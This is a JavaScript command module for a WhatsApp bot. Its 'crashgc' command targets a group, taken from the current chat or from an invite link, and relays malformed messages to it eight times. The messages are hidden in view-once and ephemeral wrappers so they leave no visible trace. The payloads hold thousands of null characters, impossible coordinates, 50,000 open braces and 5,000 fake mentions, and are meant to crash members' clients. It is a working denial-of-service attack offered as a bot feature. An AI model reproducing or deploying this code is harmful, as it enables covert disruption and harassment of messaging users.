import { isPremiumUser } from '../../utils/premiumStore.js';
import axios from 'axios';

export default {
    name: 'crashgc',
    aliases: ['xgroup', 'groupbug', 'gcbug'],
    category: 'bug',
    description: 'Bug a group (by link or current group). Invisible relay.',
    usage: 'crashgc [gclink] | crashgc https://chat.whatsapp.com/xxx',
    cooldown: 30,
    ownerOnly: true,

    async execute({ sock, message, args, from, sender, command, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner)
            return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });

        let targetGC = from;
        let input = args.join(' ').trim();

        if (input.includes('chat.whatsapp.com') || input.includes('whatsapp.com')) {
            const linkMatch = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
            if (!linkMatch) return sock.sendMessage(from, { text: '❌ Invalid group link.' }, { quoted: message });
            try {
                const code = linkMatch[1];
                const gcData = await sock.groupGetInviteInfo(code);
                targetGC = gcData.id;
                if (!targetGC) return sock.sendMessage(from, { text: '❌ Cannot resolve group. Bot must be in the group.' }, { quoted: message });
            } catch { return sock.sendMessage(from, { text: '❌ Bot not in that group or invalid link.' }, { quoted: message }); }
        }

        await sock.sendMessage(from, { react: { text: '💀', key: message.key } });
        await sock.sendMessage(from, { text: '💀 Crashing group...' }, { quoted: message });

        // Invisible relay - no visible messages in the target group
        for (let i = 0; i < 8; i++) {
            try { await sock.relayMessage(targetGC, { viewOnceMessage: { message: { groupStatusMentionMessage: { message: "\u0000".repeat(5000) }, messageContextInfo: { deviceListMetadata: {} } } } }, {}); } catch {}
            try { await sock.relayMessage(targetGC, { ephemeralMessage: { message: { interactiveMessage: { header: { title: "💀", hasMediaAttachment: false, locationMessage: { degreesLatitude: -9999999999, degreesLongitude: 9999999999, name: "X".repeat(5000) } }, body: { text: "\u0000".repeat(5000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(50000) }, contextInfo: { mentionedJid: Array.from({ length: 5000 }, (_, i) => `gc${i}@s.whatsapp.net`) } } } } }, {}); } catch {}
            await new Promise(r => setTimeout(r, 200));
        }
        await sock.sendMessage(from, { text: '✅ Group crashed (invisible)' }, { quoted: message });
        await sock.sendMessage(from, { react: { text: '✅', key: message.key } });
    }
};
